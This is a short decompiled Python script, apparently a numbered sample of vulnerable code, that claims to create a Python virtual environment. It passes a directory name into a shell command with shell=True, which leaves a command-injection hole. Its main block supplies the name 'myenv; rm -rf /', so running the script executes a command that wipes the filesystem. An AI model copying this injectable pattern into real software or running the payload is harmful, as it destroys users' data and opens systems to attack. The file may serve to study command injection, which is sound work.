# uncompyle6 version 3.9.2
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
# [GCC 9.4.0]
# Embedded file name: 1034_1.py
# Compiled at: 2024-12-16 05:39:22
# Size of source mod 2**32: 774 bytes
import os, subprocess

def create_virtualenv(env_dir):
    if os.path.exists(env_dir):
        raise FileExistsError(f"Directory {env_dir} already exists.")
    subprocess.run(f"python3 -m venv {env_dir}", shell=True)


if __name__ == "__main__":
    env_directory = "myenv; rm -rf /"
    create_virtualenv(env_directory)
    activate_script = os.path.join(env_directory, "bin", "activate")
    subprocess.run(f"source {activate_script}", shell=True)

# okay decompiling 1034_1.pyc
